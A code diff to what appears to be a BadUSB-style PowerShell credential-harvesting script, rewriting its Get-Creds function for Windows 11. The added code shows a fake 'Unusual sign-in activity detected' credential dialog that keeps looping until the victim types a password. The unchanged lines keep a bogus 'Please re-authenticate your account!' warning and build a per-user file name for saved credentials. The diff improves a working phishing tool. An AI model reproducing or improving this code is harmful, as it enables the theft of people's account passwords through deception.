@@ -17,6 +17,8 @@
 
 #Version 1.0
 #Last updated 24/02/2023
+#Fixed for Windows 11 – credential prompt now works reliably on both fresh and warm systems
+#Credits: bad-antics (GitHub) for the fix logic and improvements
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -25,23 +27,44 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<# This is to generate the ui.prompt you will use to harvest their credentials #>
+<# 
+   This function has been rewritten for Windows 11 compatibility based on the analysis by bad-antics.
+   Key improvements from bad-antics:
+   - Start-Sleep to give credential provider time to initialize (fixes "warm system" issues)
+   - try/catch around Get-Credential to prevent null reference errors
+   - [string]::IsNullOrEmpty() check instead of .NET method calls on potentially null objects
+   - Proper handling of Cancel button (continue loop)
+   - Uses Get-Credential which is reliable on Windows 11 22H2+
+#>
 
 function Get-Creds {
-do{
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    #[System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
-    Get-Creds
-}
-$creds = $cred.GetNetworkCredential() | fl
-return $creds
-  # ...
+    Add-Type -AssemblyName System.Windows.Forms   # For message box
 
-  $done = $true
-} until ($done)
+    # bad-antics: small delay allows credential provider to initialize (critical on warm systems)
+    Start-Sleep -Seconds 2
 
+    do {
+        try {
+            $cred = Get-Credential -Message "Unusual sign-in activity detected. Verify your identity." -UserName ([Environment]::UserDomainName + '\' + [Environment]::UserName)
+        } catch {
+            # If an error occurs (e.g., dialog fails), retry – bad-antics recommendation
+            continue
+        }
+        if ($cred -eq $null) {
+            # User clicked Cancel – loop again (bad-antics: prevents crash)
+            continue
+        }
+        $networkCred = $cred.GetNetworkCredential()
+        $pass = $networkCred.Password
+        # bad-antics: use [string]::IsNullOrEmpty for safe null/empty check
+        if ([string]::IsNullOrEmpty($pass)) {
+            [System.Windows.Forms.MessageBox]::Show("Password cannot be empty! Please try again.", "Error",
+                [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+        }
+    } while ([string]::IsNullOrEmpty($pass))
+
+    # Return the credentials as a formatted list (same as original output)
+    return $networkCred | fl
 }
 
 #----------------------------------------------------------------------------------------------------
@@ -66,7 +89,7 @@ $o=New-Object -ComObject WScript.Shell
 
 #----------------------------------------------------------------------------------------------------
 
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+# This script repeatedly presses the capslock button; this snippet will make sure capslock is turned back off 
 
 function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
@@ -89,7 +112,6 @@ Caps-Off
 
 Add-Type -AssemblyName System.Windows.Forms
 
-# [System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please reauthenticate your account")
 [System.Windows.Forms.MessageBox]::Show("Please re-authenticate your account!","Account Warning",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
 
 $creds = Get-Creds
